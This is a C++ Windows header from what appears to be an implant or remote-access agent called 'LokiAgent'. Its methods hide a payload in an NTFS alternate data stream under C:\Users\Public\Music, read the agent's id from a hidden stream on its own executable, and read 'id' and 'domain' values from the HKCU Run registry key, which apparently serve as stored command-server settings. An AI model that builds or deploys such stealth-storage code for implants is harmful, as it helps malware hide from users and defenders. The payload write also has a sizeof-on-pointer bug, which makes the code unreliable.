#pragma once
#include <Windows.h>
#include <iostream>
#include <string>


using namespace std;

class IPC {
public:

    bool storeStringADS(char my_payload[]) {
        const char* filename = "C:\\Users\\Public\\Music\\file.txt";
        const char* streamname = "hiddenstream";

        char fullpath[1024];
        sprintf(fullpath, "%s:%s", filename, streamname);
        // my_payload[] = "string to be written to the ADS";

        HANDLE hFile = CreateFileA(fullpath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
			        cout << "Error creating file: " << GetLastError() << endl;
			        return false;
		        }

        DWORD dwBytesWritten;
        if (!WriteFile(hFile, my_payload, sizeof(my_payload), &dwBytesWritten, NULL)) {
            cout << "Error writing to file: " << GetLastError() << endl;
            CloseHandle(hFile);
            return false;
        }

        CloseHandle(hFile);
        return true;
    }


    std::wstring readFromRegistry() {
        HKEY hKey;
        std::wstring valor;

        // Abrir la clave del registro
        if (RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD bufferSize = 1024; // Tamaño del buffer para el valor del registro
            wchar_t buffer[1024]; // Buffer para almacenar el valor del registro
            DWORD valueType;

            // Leer el valor del registro
            if (RegQueryValueEx(hKey, L"id", NULL, &valueType, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                if (valueType == REG_SZ) { // Comprobar que el valor es de tipo REG_SZ (cadena)
                    valor = buffer;
                }
            }

            // Cerrar la clave del registro
            RegCloseKey(hKey);
        }

        return valor;
    }
    
    std::wstring readDomainFromRegistry() {
        HKEY hKey;
        std::wstring valor;

        if (RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD bufferSize = 1024; 
            wchar_t buffer[1024];
            DWORD valueType;

            if (RegQueryValueEx(hKey, L"domain", NULL, &valueType, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                if (valueType == REG_SZ) { 
                    valor = buffer;
                }
            }
            RegCloseKey(hKey);
        }
        return valor;
    }


    string readStringADS() {
		const char* filename = "LokiAgent.exe";
		const char* streamname = "id";

		char fullpath[1024];
		sprintf(fullpath, "%s:%s", filename, streamname);

		HANDLE hFile = CreateFileA(fullpath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE) {
			cout << "Error creating file: " << GetLastError() << endl;
			return "";
		}

		char buffer[1024];
		DWORD dwBytesRead;
		if (!ReadFile(hFile, buffer, sizeof(buffer), &dwBytesRead, NULL)) {
			cout << "Error reading from file: " << GetLastError() << endl;
			CloseHandle(hFile);
			return "";
		}

		CloseHandle(hFile);
		return string(buffer);
	}


};